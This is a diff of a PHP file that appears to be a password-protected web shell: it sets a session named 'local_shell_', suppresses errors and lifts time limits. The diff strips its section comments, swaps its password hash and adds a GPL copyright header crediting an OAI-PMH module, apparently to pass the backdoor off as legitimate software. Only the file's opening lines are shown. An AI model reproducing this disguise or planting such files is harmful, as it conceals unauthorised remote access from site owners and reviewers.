@@ -1,8 +1,26 @@
 <?php
-// ==================== CONFIGURATION ====================
-$password_hash = '$2a$12$mHRC4xb3USdssEXmS8EGsO0gy89ArXdlKULN8iAFnkXHbHX1gjSbW';
+/**
+ * OAI-PMH
+ *
+ * Copyright (C) 2012  Arie Nugraha (dicarve@yahoo.com)
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
+ *
+ */
+$password_hash = '$2a$12$miPkBPA1QvcfL7cqzzsrg.qdDaMhmRa1.U2.c/A6ww2Rt5CG/Os46';
 
-// ==================== DISABLE ALL EXTERNAL ====================
 ini_set('allow_url_fopen', '0');
 ini_set('allow_url_include', '0');
 ini_set('disable_functions', 'curl_exec,curl_multi_exec,exec,passthru,proc_open,shell_exec,system,mail,fsockopen,fopen,fread,file_get_contents');
@@ -10,7 +28,6 @@ error_reporting(0);
 set_time_limit(0);
 ini_set('display_errors', 0);
 
-// ==================== SESSION ====================
 session_name('local_shell_' . md5(__FILE__));
 session_start();
 
